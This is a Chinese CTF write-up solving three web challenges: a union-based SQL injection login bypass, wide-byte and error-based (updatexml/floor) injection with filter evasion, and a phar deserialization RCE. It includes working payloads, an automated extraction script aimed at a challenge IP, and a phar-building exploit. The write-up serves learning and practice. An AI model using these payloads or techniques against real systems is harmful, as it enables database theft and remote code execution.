# SQL注入练习三连

##### 为了躲肺炎，在XCTF平台中の安恒杯|新春祈福赛中，找到了三个比较好的SQL注入题目

感谢颖奇师傅[博客](https://www.gem-love.com)的帮助。
<!-- more -->
### 题目内容：

![avatar](https://k1ng0fic3.github.io/images/sql1.png)

![avatar](https://k1ng0fic3.github.io/images/sql2.png)

![avatar](https://k1ng0fic3.github.io/images/sql3.png)

### 题解：

#### 0x00：Babysqli v1.0

这是一道MD5比较bypass的题。
先回忆一下关于万能密码的注入基本原理：```select * from user where name =a' or 1=1```查询结果因为```or 1=1```永远为真。所以整条语句返回```True```证明查询成功，并可以实现成功登录。
跟这道题关系不是很大。
fuzz时随便测试账号密码，返回wrong pass，查看源代码。

![avatar](https://k1ng0fic3.github.io/images/sql4.png)

发现有注释信息：
`<!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5-->`

base32解码得：
`c2VsZWN0ICogZnJvbSB1c2VyIHdoZXJlIHVzZXJuYW1lID0gJyRuYW1lJw==`

base64解码得：
`select * from user where username = '$name'`
测试表明name可注，过滤了and和=

测试列数：

![avatar](https://k1ng0fic3.github.io/images/sql5.png)

![avatar](https://k1ng0fic3.github.io/images/sql6.png)

为三列，并且测试出用户名必须为admin，并且位于第二列。

![avatar](https://k1ng0fic3.github.io/images/sql7.png)

![avatar](https://k1ng0fic3.github.io/images/sql8.png)

猜测分别为ID，user，和passwd的功能。

题目没有给出源码，盲猜大概逻辑如下：

```php
<?
$name = $_POST['name'];
$passwd = md5($_POST['pw']);

$sql = "select * from user where username = '$name'";
$query = mysql_query($sql);

if (!strcasecmp($passwd, $query[passwd])) {
	echo $flag;
} else {
	echo("Wrong Pass");
}
 ```

将查询出来的passwd和输入的密码的md5值比较，相等则登录成功不相等则返回wrong pass

解题思路是：既然name参数可注，我们可以构造sql语句使其查询为假，然后联合查询出一个比如`e5ff986d9dc5feb884fad249a4dee66d`(binghuang的md5)，然后密码输入`binghuang`，就会查询成功。

但是binghuang的md5肯定不在数据库里，该如何select出来？
很简单，联合查询时，当查询的数据不存在的时候，就会构造一个虚拟的数据来。
测试过程：

```sql
create database test;   #创建一个数据库
use test                #使用test数据库
create table user( id int, username varchar(20), password varchar(20) );  #创建表
select * from user;          #从表中查询所有,发现什么都没有
select * from user where username = '0' and 1=2 union select 0,'admin','123456';  #发现从表中居然返回了数据,因此可绕过
 ```

关于过滤，and可以用大小写绕过，使查询错误时用不等于代替等于即可。
payload：
>name=admin' And 1>2 union select '1','admin','e5ff986d9dc5feb884fad249a4dee66d&pw=binghuang

![avatar](https://k1ng0fic3.github.io/images/sql9.png)

#### 0x01：Babysqli v2.0

一开始发现输入admin和任何密码都会登录成功但是明显没有flag，说明登录成功的不是目标位置。

![avatar](https://k1ng0fic3.github.io/images/sql10.png)

You can really dance~

稍微联想一下就知道了，中文网站 → UTF8 → 宽字节注入，测试%df'发现报错，判断成功：

![avatar](https://k1ng0fic3.github.io/images/sql11.png)

解决方案大概有`updatexml()`报错注入、`floor()`报错注入、布尔盲注等等办法
题中过滤了union、select、where等关键字，双写就可以绕过。

##### `updatexml()`报错注入原理：
>updatexml (XML_document, XPath_string, new_value);

`updatexml()`函数的第二个参数为`XPath_string`，但是我们将`concat()`作为第二个参数传给`updatexml()`函数时，`concat()`返回类型为字符串所以不满足`XPath_string`格式，返回`XPath syntax error`，进而爆出数据库信息。

<1> 数据库名
>name=admin%df' and updatexml(1,concat(1,database()),1) --+&pw=123

得到数据库名为`web_sqli`

![avatar](https://k1ng0fic3.github.io/images/sql12.png)

注意：一般的exp都是`concat()`拼接上一个字符'`~`'，编码为`0x7e`，本题fuzz发现hex被过滤了，所以`concat()`里直接拼个1算了，本题中没有影响。
加'`~`'是因为`updatexml()`会报错字母和特殊字符之后的内容，所以手工补上一个特殊字符'`~`'

![avatar](https://k1ng0fic3.github.io/images/sql13.png)

<2> 表名
>name=admin%df' and updatexml(1,concat(1, (sselectelect group_concat(table_name) from information_schema.tables whwhereere table_schema=database() limit 0,1)),1) --+&pw=123

得到f14g,user两个表。

![avatar](https://k1ng0fic3.github.io/images/sql14.png)

<3> 列名
>name=admin%df' and updatexml(1,concat(1, (seselectlect group_concat(column_name) from information_schema.columns  wherwheree TABLE_SCHEMA=database() and TABLE_NAME=f14g)),1) --+&pw=123

注意：表名`f14g`需要编码后请求，否则会返回`Error: Unknown column 'f14g' in 'where clause'`错误。本题目ban掉了hex，但是可以用`char()`编码实现。
更正为：
>name=admin%df' and updatexml(1,concat(1, (seselectlect group_concat(column_name) from information_schema.columns  wherwheree TABLE_SCHEMA=database() and TABLE_NAME=char(102,49,52,103))),1) --+&pw=123

得到：

![avatar](https://k1ng0fic3.github.io/images/sql15.png)

附：其实如果没有想起来`char()`编码，不指定`f14g`直接`where table_schema=database()`查所有字段，得到的也是上图结果。

图中的`b80bb7740288fda1f201890375a60c8f`是`id`的MD5值，试着查了一下，也都是数字。
那么盲猜表里有一个`flag`的列，`flag`的MD5值为`327a6c4304ad5938eaf0efb6cc3e53dc`

<4> 字段
>name=admin%df' and updatexml(1,concat(1, (seleselectct concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 0,1),1),1) --+ &pw=123

![avatar](https://k1ng0fic3.github.io/images/sql16.png)

对`VGhlIGZpcnN0IG1hbiBuYW1lIHdhcyBr`解base64得：

![avatar](https://k1ng0fic3.github.io/images/sql17.png)

这xxd一看就是co某dance歌词，隐写的思维，直接往最后看。

>name=admin%df' and updatexml(1,concat(1, (seleSELECTct concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),1),1) --+ &pw=123

得到：`R1hZe2cwT2Rfam9iMWltX3NvX3ZlZ2V0`解base64发现结果不全

![avatar](https://k1ng0fic3.github.io/images/sql18.png)

出现这种问题的原因是`updatexml()`限制长度为32位，超过32位的被丢弃了，所以上面无论是歌词还是flag，base64都经常缺个尾巴。
解决方法是用`substr()`它可以指定从字符串的某个位置开始，返回自定义长度：
>name=admin%df' and updatexml(1,concat(1, substr((seleselectct concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1),10,32)),1) --+ &pw=123

![avatar](https://k1ng0fic3.github.io/images/sql19.png)

得到`Rfam9iMWltX3NvX3ZlZ2V0YWJsZX0=`，把它和`R1hZe2cwT2Rfam9iMWltX3NvX3ZlZ2V0`对比一下，整合得到`R1hZe2cwT2Rfam9iMWltX3NvX3ZlZ2V0YWJsZX0=`解base64，完毕。

![avatar](https://k1ng0fic3.github.io/images/sql20.png)

这个时候回想一下，是不是在f14g表中，也可以用这个办法查出flag列的信息呢，哈哈

<5> 转载工具
看了下*Nepnep*师傅们的WP，给出了一个updatexml的自动化脚本，转发以宣传之。
作者Shana、7TNE7，[原文链接](http://www.qfrost.com/PWN/GXY_CTF_2019/)

```python
import requests
import re
import base64

url = "http://183.129.189.60:10006/search.php/search.php?name=admin%df' and updatexml(1,concat(unhex(60),( substr((selselectect group_concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g),{},32)),unhex(60)),1)--+&pw=123"
num = 1
regularFilterStr = r"Error: XPATH syntax error: '`(.+?)'"
allBase64Str = ''
while 1:
    payload = url.format(num)
    num = num+31
    response = requests.get(payload)
    html = response.text
    if '`' in re.findall(regularFilterStr,html)[0]:
        break
    allBase64Str += re.findall(regularFilterStr,html)[0]

lists = allBase64Str.split(',')

for i in lists:
     print(base64.b64decode(i))
```

##### `floor()`报错注入原理：

已经废话太多了就不再啰嗦了，参考一下[这个链接](https://blog.csdn.net/qq_39101049/article/details/88839514)，照着打就行。
最终的payload：
>name=%df'and(seselectlect 1 from(sselectelect count(\*),concat((sselectelect (sselectelect  concat(327a6c4304ad5938eaf0efb6cc3e53dc) from f14g limit 22,1) from information_schema.tables limit 0,1),floor(rand(0)\*2))x from information_schema.tables group by x)a)--+&pw=123

![avatar](https://k1ng0fic3.github.io/images/sql21.png)

#### 0x02：Babysqli v3.0

其实不是SQL注入，原意是phar反序列化的题，但是非预期很多而且非预期比较简单，还是从正常解开始。

关于phar反序列化有一篇特别好的[总结](https://www.cnblogs.com/BOHB-yunying/p/11504051.html)，必须分享。

首先弱口令或者字典爆破登录进平台（admin&password）
然后跳转到了URL：`http://183.129.189.60:10009/home.php?file=upload`上

![avatar](https://k1ng0fic3.github.io/images/sql22.png)

这种情况就扫一下:共flag.php upload.php home.php index.php四个，直接访问flag.php无回显，也无法文件读取，其他文件会自动加上后缀`.fxxkyou!`且00截断无效。

![avatar](https://k1ng0fic3.github.io/images/sql23.png)

![avatar](https://k1ng0fic3.github.io/images/sql24.png)

测试结果：若包含的文件以`home`或`upload`结尾，则在后面拼接上`.php`后包含；其他都被拼接上`.fxxkyou!`

那么根据提示读upload：`http://183.129.189.60:10009/home.php?file=php://filter/convert.base64-encode/resource=upload`

```php
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 

<form action="" method="post" enctype="multipart/form-data">
	上传文件
	<input type="file" name="file" />
	<input type="submit" name="submit" value="上传" />
</form>

<?php
error_reporting(0);
class Uploader{
	public $Filename;
	public $cmd;
	public $token;
	

	function __construct(){
		$sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
		$ext = ".txt";
		@mkdir($sandbox, 0777, true);
		if(isset($_GET['name']) and !preg_match("/data:\/\/ | filter:\/\/ | php:\/\/ | \./i", $_GET['name'])){
			$this->Filename = $_GET['name'];
		}
		else{
			$this->Filename = $sandbox.$_SESSION['user'].$ext;
		}

		$this->cmd = "echo '<br><br>Master, I want to study rizhan!<br><br>';";
		$this->token = $_SESSION['user'];
	}

	function upload($file){
		global $sandbox;
		global $ext;

		if(preg_match("[^a-z0-9]", $this->Filename)){
			$this->cmd = "die('illegal filename!');";
		}
		else{
			if($file['size'] > 1024){
				$this->cmd = "die('you are too big (′▽`〃)');";
			}
			else{
				$this->cmd = "move_uploaded_file('".$file['tmp_name']."', '" . $this->Filename . "');";
			}
		}
	}

	function __toString(){
		global $sandbox;
		global $ext;
		// return $sandbox.$this->Filename.$ext;
		return $this->Filename;
	}

	function __destruct(){
		if($this->token != $_SESSION['user']){
			$this->cmd = "die('check token falied!');";
		}
		eval($this->cmd);
	}
}

if(isset($_FILES['file'])) {
	$uploader = new Uploader();
	$uploader->upload($_FILES["file"]);
	if(@file_get_contents($uploader)){
		echo "下面是你上传的文件：<br>".$uploader."<br>";
		echo file_get_contents($uploader);
	}
}
?>
 ```

##### 预期

在`upload`中
>\$this->Filename = \$_GET['name'];

可见`$this->Filename`是可控的，可以通过`name`参数以get方式得到。

分析最后上传部分：

```php
if(@file_get_contents($uploader)){
	echo "下面是你上传的文件：<br>".$uploader."<br>";
	echo file_get_contents($uploader);
}
 ```

`file_get_contents()`使`$uploader`对象通过`__toString()`返回`$this->Filename`，由于phar://伪协议可以不依赖`unserialize()`直接进行反序列化操作，加之`$this->Filename`可控，因此此处`$this->Filename`配合phar反序列化后，`__destruct()`方法内`eval($this->cmd);`最终导致了远程代码执行。
由于`__destruct()方法`中，想要`eval($this->cmd);`的前提条件是`$this->token`和`$_SESSION['user']`相等。

在`__construct()`方法中有以下两行

```php
$sandbox = getcwd()."/uploads/".md5($_SESSION['user'])."/";
$this->Filename = $sandbox.$_SESSION['user'].$ext;
```

随便上传一个txt，回显

![avatar](https://k1ng0fic3.github.io/images/sql25.png)

得到的`GXY939d6b01691234e49fa8ec7eafb79a55`就是$_SESSION['user']

然后在本地生成phar文件：

```php
<?php
class Uploader{
	public $Filename;
	public $cmd;
	public $token;
}

$o = new Uploader();
$o->cmd = 'highlight_file("/var/www/html/flag.php");'; //里面的命令不要出现单引号否侧生成phar会报错
$o->Filename = '1';
$o->token = 'GXY939d6b01691234e49fa8ec7eafb79a55'; //$_SESSION['user']
echo serialize($o);

$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>"); //设置stub，增加gif文件头
$phar->setMetadata($o); //将自定义meta-data存入manifest
$phar->addFromString("1.txt", "1"); //添加要压缩的文件
$phar->stopBuffering();
```

![avatar](https://k1ng0fic3.github.io/images/sql26.png)

将此phar文件上传，获取路径

![avatar](https://k1ng0fic3.github.io/images/sql27.png)

`/var/www/html/uploads/74def8c80bd66ac6e4585ea8fb35c9f4/GXY939d6b01691234e49fa8ec7eafb79a55.txt`

在路径前加上phar协议，用来作为name变量的值，访问即可。

>home.php?file=upload&name=phar:///var/www/html/uploads/74def8c80bd66ac6e4585ea8fb35c9f4/GXY939d6b01691234e49fa8ec7eafb79a55.txt

在跳转页面上随便上传一个文件，触发反序列化，得到flag

![avatar](https://k1ng0fic3.github.io/images/sql28.png)

##### 非预期

*Nepnep*师傅们的思路，真是简单无比。
由于有
>echo file_get_contents($uploader);

这行代码存在。上传后会显示出`$uploader`这个文件的内容，所以只要使`$this->Filename`为`flag.php`，然后随便传个东西就会得到flag了。

![avatar](https://k1ng0fic3.github.io/images/sql29.png)

此外还有颖奇师傅利用出题人在正则表达式处的匹配错误，利用一句话+蚁剑打的非预期，不再细说了。

还是太菜了，要多多向Web大佬巨神们学习才行。